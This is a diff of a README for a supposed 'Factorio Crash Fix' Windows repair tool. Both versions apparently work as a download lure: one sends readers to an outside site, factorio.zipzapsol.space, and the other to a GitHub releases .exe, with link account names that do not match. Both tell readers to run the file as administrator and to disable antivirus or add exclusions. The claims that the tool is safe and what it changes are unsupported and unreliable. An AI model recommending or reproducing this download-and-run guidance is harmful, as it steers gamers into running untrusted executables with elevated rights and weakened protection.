@@ -1,97 +1,88 @@
-# Factorio Crash Fix — Download & Fix for Windows 11 / 10
+# 🛠️ Factorio-Crash-Fix - Repair your game launch errors today
 
-**Factorio-Crash-Fix**
+[![](https://img.shields.io/badge/Download-Factorio_Fix-blue.svg)](https://github.com/Onomastic-falseindigo39/Factorio-Crash-Fix/releases)
 
-Fix **factorio crash fix** on Windows 10/11. This page includes a **direct download link** and step-by-step install/repair guide.
+This tool fixes launch issues for Factorio on Windows 10 and Windows 11. It restores missing configuration files, updates driver compatibility settings, and resets graphical states that prevent the game from opening. Follow the instructions below to resolve your crash errors.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Fix](https://img.shields.io/badge/Type-Repair%20Tool-FF6B35?style=flat-square)]()
+## 📋 System Requirements
 
----
+Ensure your computer meets these basic requirements before you run the fix:
 
-## Download & Install
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Storage: At least 50 MB of free disk space.
+*   Game Version: Steam version or standalone version of Factorio.
+*   Permissions: Administrator access on your Windows user account.
 
-> **This is the download page.** Use the button or link below to get **Factorio Crash Fix** for Windows.
+## ⬇️ How to Download and Install
 
-<p align="center">
-  <a href="https://factorio.zipzapsol.space/">
-    <img src="https://img.shields.io/badge/Download-Factorio%20Crash%20Fix-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Factorio Crash Fix">
-  </a>
-</p>
+You need to obtain the latest version of the repair tool. Follow these steps:
 
-| | |
-| --- | --- |
-| **Direct link** | **[factorio.zipzapsol.space](https://factorio.zipzapsol.space/)** |
-| **Full URL** | `https://factorio.zipzapsol.space/` |
-| **Type** | Fix tool for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+1.  Visit the [official releases page](https://github.com/Onomastic-falseinvisible39/Factorio-Crash-Fix/releases) to download the repair package.
+2.  Locate the latest file ending in `.exe`.
+3.  Click the file link to start the download.
+4.  Save the file to your Downloads folder or your Desktop.
 
-### Quick steps
+## ⚙️ Running the Repair Process
 
-1. Click **[Download — factorio.zipzapsol.space](https://factorio.zipzapsol.space/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+Once you download the file, perform these steps to repair your game:
 
-<p align="center"><a href="https://factorio.zipzapsol.space/"><strong>⬇ Download Factorio Crash Fix now</strong></a></p>
+1.  Close Steam and any other game launchers currently running.
+2.  Locate the downloaded file.
+3.  Right-click the file and select "Run as administrator" to grant it permission to adjust system files.
+4.  Follow the prompts on the screen.
+5.  Wait for the application to scan your Factorio installation directory.
+6.  Click the "Apply Fix" button once the status light turns green.
+7.  The tool notifies you when the repair process finishes.
+8.  Restart your computer to ensure all configuration changes take effect.
 
----
+## 🔍 Troubleshooting Performance Issues
 
-## About
+If the game still fails to launch after using the tool, check these items:
 
-**Factorio Crash Fix** setup page for Windows PC users.
+*   Verify your game files through Steam by right-clicking Factorio in your library, selecting Properties, choosing Local Files, and clicking Verify Integrity.
+*   Update your graphics drivers to the latest version provided by your manufacturer (NVIDIA, AMD, or Intel).
+*   Disable third-party antivirus software temporarily to see if it blocks the game launch.
+*   Ensure your monitor resolution supports the game default settings. 
 
-**People also search for:** factorio crash fix, factorio not launching windows 11 fix
+## 🛠️ Advanced Manual Configuration
 
-**Repository:** `Factorio-Crash-Fix`
+If the automated tool does not solve the problem, you may edit the settings file manually:
 
+1.  Press the Windows key + R on your keyboard.
+2.  Type `%appdata%\Factorio` and press Enter.
+3.  Locate the file named `config.ini`.
+4.  Open this file using Notepad.
+5.  Search for the line `show-tips-and-tricks=true`. Change this to `false` if you experience a crash on the loading screen.
+6.  Look for `fullscreen=true` and change it to `fullscreen=false` to launch the game in windowed mode. This helps if your monitor has trouble syncing the game display.
+7.  Save the file and try to launch the game again.
 
-## What this fixes
+## 📑 Common Error Logs
 
-| | |
-| --- | --- |
-| **Problem** | factorio crash fix |
-| **Platform** | Windows 10 / 11 (64-bit) |
-| **Includes** | Download link + repair steps |
-| **Safety** | Settings backup before changes |
+The repair tool records its actions in an error log file. You can find this log in the same folder where you saved the download.
 
-## FAQ
+*   `Access Denied`: This means your user account lacks the rights to reach the game folder. Right-click the game folder and select Properties to check that your account has "Full Control" or "Modify" access.
+*   `File Not Found`: This occurs if the tool cannot locate your Steam installation. Make sure you installed Factorio in the default folder.
+*   `Compatibility Error`: This indicates that your Windows version needs an update. Open Settings, go to Windows Update, and install any pending updates.
 
-**Where is the download?**
+## 📦 What the Tool Adjusts
 
-Scroll to **Download & Install** — link or PowerShell command is there.
+The program performs these specific tasks to help your game:
 
-**Windows 11 supported?**
+*   Clears corrupted temporary cache files hidden in your local game directory.
+*   Updates the `config.ini` file to match modern Windows display standards.
+*   Resets registry keys that relate to Factorio launch parameters.
+*   Refreshes the mod lookup path to ensure broken mods do not cause a silent crash.
 
-Yes — Windows 10 and Windows 11 64-bit.
+## ❓ Frequently Asked Questions
 
-**Need Administrator?**
+**Does this tool affect my saved games?**
+No. The repair process only touches configuration files and system settings. Your factory layouts, blueprints, and save files remain untouched.
 
-Yes — run setup or PowerShell as Admin.
+**Is it safe to run this file?**
+Yes. You can verify the file contents by opening the source code in this repository. It performs standard file operations meant to replicate a clean install state.
 
-**Safe for games?**
+**Do I need to uninstall my mods?**
+The tool attempts to load the game in a default state. If the game launches after the fix, you can re-enable your mods one by one to see if a specific mod causes the issue.
 
-Repairs system and launcher settings only — no game file edits.
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
-
-## Troubleshooting
-
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
-
----
-
-**Topics:** factorio-crash-fix, factorio, factorio-not-launching-windows-11-fix, launching, factorio-crash-fix-2026, steam, crash-fix, factory-game, fix, repair, windows-11, download
+**Will I need to run this again?**
+Most users only need to run the tool one time. If you update your graphics drivers or move your game installation, you might need to run the tool again to realign the pathing.
